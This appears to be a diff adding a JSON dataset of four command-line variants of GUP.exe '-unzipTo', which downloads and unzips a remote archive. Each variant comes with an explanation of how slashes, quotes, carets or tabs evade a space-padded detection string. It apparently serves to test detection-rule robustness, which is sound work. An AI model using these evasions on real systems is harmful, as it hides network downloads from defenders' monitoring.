@@ -1,0 +1,18 @@
+[
+  {
+    "output": "GUP.exe /unzipTo \"\" \"C:\\Temp\" \"Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6\"",
+    "explanation": "Substitution technique: Built-in and common third-party Windows binaries utilizing standard command-line argument parsing patterns often support forward slashes ('/') interchangeably with hyphens ('-') for option markers. Substituting '-unzipTo' with '/unzipTo' completely avoids the literal ' -unzipTo ' string pattern (which enforces a leading space and a hyphen) while maintaining the original unzip and download behavior."
+  },
+  {
+    "output": "GUP.exe \"-unzipTo\" \"\" \"C:\\Temp\" \"Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6\"",
+    "explanation": "Insertion technique: Enclosing the parameter flag inside double quotes ('\"-unzipTo\"') alters the string logged in process creation events. The literal string checker in 'selection_cli' looks for ' -unzipTo ' (padded with spaces), but the presence of quotes breaks this exact contiguous character stream matching, whereas the Windows subsystem transparently strips the quotes before the binary parses its arguments."
+  },
+  {
+    "output": "cmd.exe /c GUP.exe -unzipTo^  \"\" \"C:\\Temp\" \"Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6\"",
+    "explanation": "Insertion technique: Running the command through cmd.exe permits the insertion of a shell caret escape character ('^') inside the trailing space of the argument flag structure. The parent command interpreter strips the caret before launching GUP.exe, recording '-unzipTo^  ' in the process logs which effectively breaks the strict ' -unzipTo ' space-padded constraint."
+  },
+  {
+    "output": "GUP.exe\t-unzipTo\t\"\"\t\"C:\\Temp\"\t\"Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6\"",
+    "explanation": "Substitution technique: Replacing structural parameter-separating space characters with horizontal tab characters ('\\t'). The Windows kernel interprets tabs as valid argument white-space boundaries, executing the utility identical to spaces while completely evading the space-padded literal check for ' -unzipTo '."
+  }
+]
